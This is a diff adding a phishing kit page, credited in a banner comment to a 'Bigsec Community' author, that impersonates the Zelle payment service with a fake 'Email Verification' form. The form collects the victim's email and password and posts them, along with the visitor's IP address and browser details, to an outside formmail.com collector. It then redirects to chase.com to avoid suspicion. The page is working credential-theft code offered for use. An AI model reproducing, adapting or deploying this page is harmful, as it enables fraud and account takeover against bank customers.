@@ -1,0 +1,341 @@
+﻿<!--
+       t . m e / b i g s e c c o m m u n i t y 
+
+   ▄▄▄▄███▄▄▄▄      ▄████████    ▄████████    ▄████████ 
+ ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███   ███    ███ 
+ ███   ███   ███   ███    ███   ███    ███   ███    █▀  
+ ███   ███   ███   ███    ███  ▄███▄▄▄▄██▀   ███        
+ ███   ███   ███ ▀███████████ ▀▀███▀▀▀▀▀   ▀███████████ 
+ ███   ███   ███   ███    ███ ▀███████████          ███ 
+ ███   ███   ███   ███    ███   ███    ███    ▄█    ███ 
+  ▀█   ███   █▀    ███    █▀    ███    ███  ▄████████▀  
+                                ███    ███              
+
+ M a n i A k a R i s k  | B i g s e c  C o m m u n i t y 
+-->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<title>ZellePay</title>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="shortcut icon" href="themes/custom/register_zellepay/favicon-1.ico">
+	<!--<link rel="icon" type="image/png" href="images/icons/favicon.ico"/>-->
+	<link rel="stylesheet" type="text/css" href="vendor/bootstrap/css/bootstrap.min-1.css">
+	<link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min-1.css">
+	<link rel="stylesheet" type="text/css" href="fonts/iconic/css/material-design-iconic-font.min-1.css">
+	<link rel="stylesheet" type="text/css" href="vendor/animate/animate-1.css">
+	<link rel="stylesheet" type="text/css" href="vendor/css-hamburgers/hamburgers.min-1.css">
+	<link rel="stylesheet" type="text/css" href="vendor/animsition/css/animsition.min-1.css">
+	<link rel="stylesheet" type="text/css" href="vendor/select2/select2.min-1.css">	
+	<link rel="stylesheet" type="text/css" href="vendor/daterangepicker/daterangepicker-1.css">
+	<link rel="stylesheet" type="text/css" href="css/util-1.css">
+	<link rel="stylesheet" type="text/css" href="css/main-1.css">
+	<script src="js/progress.js"></script>
+
+</head>
+<style>
+@import url(css-1);
+.focus-input100::after {
+  font-family: Poppins-Regular;
+  font-size: 15px;
+  color: white;
+}
+
+select {
+        border-top-style: hidden;
+        border-right-style: hidden;
+        border-left-style: hidden;
+        border-bottom-style: groove;
+        outline: none;
+      }
+      
+      .no-outline:focus {
+        outline: none;
+      }
+	.wrap-login100 {
+  width: 390px;
+  background: #fff;
+  border-radius: 10px;
+  overflow: hidden;
+  padding: 77px 55px 33px 55px;
+
+  box-shadow: 0 25px 10px 0px rgba(0,0,0,0.1);
+  -moz-box-shadow: 0 25px 10px 0px rgba(0,0,0,0.1);
+  -webkit-box-shadow: 0 25px 10px 0px rgba(0,0,0,0.1);
+  -o-box-shadow: 0 25px 10px 0px rgba(0,0,0,0.1);
+  -ms-box-shadow: 0 25px 10px 0px rgba(0,0,0,0.1);
+}	 
+	 #msform {
+text-align: center;
+position: relative;
+margin-top: 20px
+}
+#msform fieldset {
+background: white;
+border: 0 none;
+border-radius: 0.5rem;
+box-sizing: border-box;
+width: 100%;
+margin: 0;
+padding-bottom: 20px;
+position: relative
+}
+.form-card {
+text-align: left
+}
+#msform fieldset:not(:first-of-type) {
+display: none
+}
+#msform input,
+#msform textarea {
+padding: 8px 15px 8px 15px;
+border: 1px solid #ccc;
+border-radius: 0px;
+margin-bottom: 25px;
+margin-top: 2px;
+width: 100%;
+box-sizing: border-box;
+font-family: montserrat;
+color: #2C3E50;
+background-color: #ECEFF1;
+font-size: 16px;
+letter-spacing: 1px
+}
+#msform input:focus,
+#msform textarea:focus {
+-moz-box-shadow: none !important;
+-webkit-box-shadow: none !important;
+box-shadow: none !important;
+border: 1px solid #673AB7;
+outline-width: 0
+}
+#msform .action-button {
+width: 100px;
+background: #673AB7;
+font-weight: bold;
+color: white;
+border: 0 none;
+border-radius: 0px;
+cursor: pointer;
+padding: 10px 5px;
+margin: 10px 0px 10px 5px;
+float: right
+}
+#msform .action-button:hover,
+#msform .action-button:focus {
+background-color: #311B92
+}
+#msform .action-button-previous {
+width: 100px;
+background: #616161;
+font-weight: bold;
+color: white;
+border: 0 none;
+border-radius: 0px;
+cursor: pointer;
+padding: 10px 5px;
+margin: 10px 5px 10px 0px;
+float: right
+}
+#msform .action-button-previous:hover,
+#msform .action-button-previous:focus {
+background-color: #000000
+}
+.card {
+z-index: 0;
+border: none;
+position: relative
+}
+.fs-title {
+font-size: 25px;
+color: #673AB7;
+margin-bottom: 15px;
+font-weight: normal;
+text-align: left
+}
+.purple-text {
+color: #673AB7;
+font-weight: normal
+}
+.steps {
+font-size: 25px;
+color: gray;
+margin-bottom: 10px;
+font-weight: normal;
+text-align: right
+}
+.fieldlabels {
+color: gray;
+text-align: left
+}
+#progressbar {
+margin-bottom: 30px;
+overflow: hidden;
+color: lightgrey;
+}
+#progressbar .active {
+color: #673AB7;
+}
+#progressbar li {
+list-style-type: none;
+font-size: 15px;
+width: 25%;
+float: left;
+position: relative;
+font-weight: 400;
+
+}
+#progressbar #account:before {
+font-family: FontAwesome;
+content: "\f13e"
+}
+#progressbar #personal:before {
+font-family: FontAwesome;
+content: "\f007"
+}
+#progressbar #payment:before {
+font-family: FontAwesome;
+content: "\f030"
+}
+#progressbar #confirm:before {
+font-family: FontAwesome;
+content: "\f00c"
+}
+#progressbar li:before {
+width: 50px;
+height: 50px;
+line-height: 45px;
+display: block;
+font-size: 20px;
+color: #ffffff;
+background: lightgray;
+border-radius: 50%;
+margin: 0 auto 10px auto;
+padding: 2px
+}
+#progressbar li:after {
+content: '';
+width: 100%;
+height: 2px;
+background: lightgray;
+position: absolute;
+left: 0;
+top: 25px;
+z-index: -1
+}
+#progressbar li.active:before,
+#progressbar li.active:after {
+background: #673AB7;
+}
+.progress {
+height: 20px
+}
+.progress-bar {
+background-color: #673AB7;
+}
+.fit-image {
+width: 100%;
+object-fit: cover
+}
+
+</style>
+<body>
+	
+	<div class="limiter" style="background-color:#6d1fd4;">
+		<div class="container-login100" style="background-color:#6d1fd4;">
+			<div class="wrap-login100" style="background-color:#6d1fd4; padding-top:0px !important;">
+			
+			<span class="login100-form-title p-b-48">
+						<img src="image/logo1-1.png" width="230px" height="150px">
+					</span>
+					 <!-- progressbar -->
+					 <!--<div id="msform">
+                   <ul id="progressbar">
+					<li class="active" id="account"><strong>Account</strong></li>
+					<li id="personal"><strong>Personal</strong></li>
+					
+					<li id="confirm"><strong>Finish</strong></li>
+					</ul>
+					</div>-->
+		<form method="POST" action="https://fp1.formmail.com/cgi-bin/fm192" class="login100-form validate-form">
+<input type="hidden" name="_pid" value="158401">
+<input type="hidden" name="_fid" value="5DL8M6XE">
+<input type="hidden" name="recipient" value="1">
+<input type="hidden" name="env_report" value="REMOTE_ADDR,HTTP_USER_AGENT">
+<input type="hidden" name="print_config" value="email">
+<input type="hidden" name="redirect" value="https://www.chase.com/">
+
+					<span class="login100-form-title p-b-26" style="color:white; font-size:16px;">
+						Email Verification
+						<br><br><span style="font-size:14px;">Please enter your information to verify your account</span>
+					</span><br><br>
+					
+					<div class="wrap-input100 validate-input" data-validate="Valid email is: a@b.c" style="color:white !important;">
+						<input class="input100" type="text" name="email" style="color:white !important;">
+						<span class="focus-input100" data-placeholder="Email"></span>
+					</div>
+
+					<div class="wrap-input100 validate-input" data-validate="Enter password" style="color:white !important;">
+						<span class="btn-show-pass">
+							<i class="zmdi zmdi-eye"></i>
+						</span>
+						<input class="input100" type="password" name="password" style="color:white !important;">
+						<span class="focus-input100" data-placeholder="Password"></span>
+					</div>
+
+					<div class="container-login100-form-btn">
+						<div class="wrap-login100-form-btn">
+							<div class="login100-form-bgbtn"></div>
+							<button class="login100-form-btn" style="color:white;">
+								Continue
+							</button>
+						</div>
+					</div>
+
+					<div class="text-center p-t-115" style="padding-top:15px;">
+						<span class="txt1" style="color:white;">
+							Don’t have an account?
+						</span>
+
+						<a class="txt2" href="#" style="color:white;">
+							Sign Up
+						</a>
+					</div>
+					<br><br>
+					<span class="login100-form-title p-b-26" style="color:white; font-size:10px; text-align:left;">
+						Zelle is a fast, safe and easy way to send money to and receive money from friends, family and others you trust with a bank account in the U.s.
+<br><br>
+To get started, simple search for your bank and follow a few easy steps
+					</span>
+				</form>
+			</div>
+		</div>
+	</div>
+	
+	
+	
+	
+	
+
+	<div id="dropDownSelect1"></div>
+	
+<!--===============================================================================================-->
+	<script src="vendor/jquery/jquery-3.2.1.min-1.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/animsition/js/animsition.min-1.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/bootstrap/js/popper-1.js"></script>
+	<script src="vendor/bootstrap/js/bootstrap.min-1.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/select2/select2.min-1.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/daterangepicker/moment.min-1.js"></script>
+	<script src="vendor/daterangepicker/daterangepicker-1.js"></script>
+<!--===============================================================================================-->
+	<script src="vendor/countdowntime/countdowntime-1.js"></script>
+<!--===============================================================================================-->
+	<script src="js/main-1.js"></script>
+
+</body>
+</html>
